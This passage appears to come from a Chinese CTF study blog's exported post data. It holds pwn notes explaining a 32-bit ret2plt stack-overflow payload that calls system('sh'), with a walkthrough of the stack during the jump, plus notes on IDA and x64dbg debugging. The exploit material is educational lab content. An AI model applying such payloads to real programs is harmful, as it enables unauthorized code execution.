打包函数 p32() p64() 解包函数 u32() u64() 32位接收 12leak = p.recv(4) # 32位泄露一般是4字节addr = u32(leak) # 转成 int 64位接收 12leak = p.recv(6) # 通常能收到6字节，有时候高两字节是0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;)) # 补成8字节再解包 ljust(length, fillchar) 会将当前的字节串 leak 左对齐到指定的 length（这里是 8 字节），并使用 fillchar（这里是 b&#39;\\x00&#39;，即空字节）从右侧进行填充。 查看调用函数的传递的参数1payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr) 1. 初始状态（执行 ret 前） 假设此时栈布局如下（根据你的 payload）： python 1payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh) 栈内存布局： text 123esp -&gt; 0x80484d0 （覆盖的返回地址，指向 system@plt）esp + 4 -&gt; 0x08048722 （伪造的返回地址）esp + 8 -&gt; 0x080482ea （参数 &quot;sh&quot; 的地址） 寄存器状态： eip：指向 GetFlag+90 的 ret 指令。 esp：指向栈顶 0x80484d0。 2. 执行 ret 指令 ret 等价于 pop eip，具体操作： 从栈顶弹出返回地址到 eip： eip = [esp] → eip = 0x80484d0（跳转到 system@plt）。 esp = esp + 4 → 栈指针上升 4 字节。 栈变化： text 12esp -&gt; 0x08048722 （原 esp + 4）esp + 4 -&gt; 0x080482ea （参数 &quot;sh&quot;） 3. 进入 system@plt 后的流程 (1) 首次调用 system@plt（GOT 未解析） system@plt 的代码： asm 1230x80484d0 &lt;system@plt&gt; jmp [0x804a024] ; 跳转到 GOT 表（首次指向下一行）0x80484d6 &lt;system@plt+6&gt; push 0x30 ; 重定位偏移0x80484db &lt;system@plt+11&gt; jmp 0x8048460 ; 跳转到动态链接器 jmp [0x804a024]： 首次调用时，GOT 表 0x804a024 中的值为 0x80484d6（即 system@plt+6），因此继续执行下一条指令。 push 0x30： esp = esp - 4 → 栈指针下降 4 字节。 [esp] = 0x30 → 将 0x30 压栈。 栈变化： text 123esp -&gt; 0x30 （新压入的值）esp + 4 -&gt; 0x08048722 （伪造的返回地址）esp + 8 -&gt; 0x080482ea （参数 &quot;sh&quot;） jmp 0x8048460： 跳转到动态链接器（_dl_runtime_resolve），解析 system 的真实地址并更新 GOT 表。 *(2) 动态链接器解析完成后 动态链接器会将 system 的真实地址写入 GOT 表 0x804a024。 后续跳转到 system 的真实代码。 4. 执行 system 函数时 (1) system 的调用约定（cdecl） 参数通过栈传递： call system 会隐式压入返回地址（但你的漏洞利用直接跳转到 system@plt，未通过 call）。 参数位于 esp + 4（因为 esp 指向返回地址）。 你的场景： 动态链接器解析完成后，直接跳转到 system 的真实代码。 此时栈布局： text 12esp -&gt; 0x08048722 （伪造的返回地址）esp + 4 -&gt; 0x080482ea （参数 &quot;sh&quot;） system 会从 esp + 4 读取参数（即 0x080482ea），执行 system(&quot;sh&quot;)。 (2) system 执行后的栈平衡 如果是正常 call system，调用者需通过 add esp, 4 清理参数。 但你的漏洞利用中： 通过 ret 跳转到 system@plt，未显式使用 call。 system 执行完毕后会返回到 0x08048722（伪造的地址）。 5. 全程 esp 变化总结 步骤 esp 变化 栈布局（栈顶向下） 执行 ret 前 esp → 0x80484d0 [0x80484d0, 0x08048722, 0x080482ea] 执行 ret esp += 4 → 0x08048722 [0x08048722, 0x080482ea] system@plt 中 push 0x30 esp -= 4 → 0x30 [0x30, 0x08048722, 0x080482ea] 动态链接器解析完成 esp 恢复为 0x08048722 [0x08048722, 0x080482ea] system 读取参数 从 esp + 4 读取 0x080482ea 参数 &quot;sh&quot; 被正确传递 6. 关键结论 ret 直接修改 eip 和 esp： 通过弹出返回地址实现控制流劫持，esp 会 +4。 system 的参数传递依赖栈布局： 确保 ret 后，esp + 4 指向参数地址（你的 payload 已满足）。 动态链接的额外栈操作： 首次调用 PLT 时会有 push 0x30，esp 会 -4，但最终不影响参数位置。 通过控制 ret 后的栈布局，你成功将 &quot;sh&quot; 传递给 system，最终获取 shell。","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"ida使用+动调","slug":"ida使用-动调","date":"2025-03-19T11:50:43.000Z","updated":"2025-07-14T07:30:59.888Z","comments":true,"path":"2025/03/19/ida使用-动调/","permalink":"http://example.com/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","excerpt":"","text":"ida动态调试断点一般打的都是软件断点 硬件断点的设法：打好断点后 打开找到刚才打下的断点后右键Edit编辑勾选Hardware 差别： 1. 实现原理： 软件断点： 软件断点是通过修改程序指令来实现的。在代码中插入一个特定的中断指令（例如，在x86架构中是INT 3指令）。 调试器会记录被替换的原始指令，并在程序继续执行时恢复它。 硬件断点： 硬件断点不需要修改程序代码。 2. 资源限制： 软件断点： 软件断点在数量上没有严格的限制，可以在程序中的任意位置设置。 硬件断点： CPU提供的硬件断点寄存器数量有限，因此可以同时设置的硬件断点数量也有限。（最多四个） 3. 使用场景： 软件断点： 软件断点适用于大多数调试场景，特别是在需要设置大量断点时。 硬件断点： 硬件断点适用于以下场景： 调试无法修改代码的程序，例如只读内存中的代码。 调试需要精确控制执行流程的程序，例如内核代码或驱动程序。 调试数据断点，就是当某个内存地址被读取或者写入的时候出发断点，这是硬件断点特有的功能。 4. 隐蔽性： 软件断点： 软件断点会修改程序代码，因此可能会被一些反调试技术检测到。 硬件断点： 硬件断点不会修改程序代码，因此具有更高的隐蔽性。 总结： 软件断点灵活方便，适用于大多数调试场景，但可能会被反调试技术检测到。 硬件断点隐蔽性高，适用于特殊调试场景，但数量有限 条件断点 条件断点是一种在调试器中设置的断点，它仅在满足特定条件时才会触发。在框位置输入条件 更改字节选中要更改的那个字节 右键 更改之后Apply patch to 应用这个补丁 [FlareOn6]Overlong elf文件动态调试1.找到ida的根目录，找到dbgsrv文件，在该文件中找到 根据elf文件的进制选择（以64进制和snake.elf为例） 将linux server64和snake拖入文件夹中 之后在虚拟机终端内输出chmod +x linux_server64赋予文件执行权利 之后输入./linux_server64运行文件（之后等待主机连接） 再打开一个终端输入ip addr获取虚拟机ip地址 检测是否可以成功： 打开主机终端输入 ping +虚拟机ip(下图即为来连接成功) 之后打开Debugger&gt;Process options&gt; 1:填snake在虚拟机中的位置 2：填snake在虚拟机所在文件的文件位置 3：填虚拟机ip 4:运行.&#x2F;linux_server64后，输出Listening on 0.0.0.0:23946（一般默认） 之后就可以正常运行（下次运行时在此运行.&#x2F;linux_server64，并把文件拖入想相同目录即可） 显示所有机器码：​ Options&gt;general&gt;改为10 x64dbgF2：设置断点。）F4：运行到光标处F7：单步步入。（遇到call指令，进入call函数的实现处继续执行汇编指令）F8：单步步过。（遇到call指令，执行call函数，之后接着执行call指令的下一条指令）F9：运行程序（如果没有碰到断点，程序会一直执行到结束。） Ctrl+F9: 执行到函数返回处，用于跳出函数实现 Alt+F9:执行到用户代码，用于快速跳出系统函数 Ctrl+G:输入十六进制地址，快速定位到该地址处","categories":[],"tags":[{"name":"动调","slug":"动调","permalink":"http://example.com/tags/%E5%8A%A8%E8%B0%83/"}]}],"categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"},{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ret2libc_printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"printf","slug":"printf","permalink":"http://example.com/tags/printf/"},{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"猜数","slug":"猜数","permalink":"http://example.com/tags/%E7%8C%9C%E6%95%B0/"},{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"},{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"RC4变式","slug":"RC4变式","permalink":"http://example.com/tags/RC4%E5%8F%98%E5%BC%8F/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"},{"name":"RC4","slug":"RC4","permalink":"http://example.com/tags/RC4/"},{"name":"动调","slug":"动调","permalink":"http://example.com/tags/%E5%8A%A8%E8%B0%83/"}]}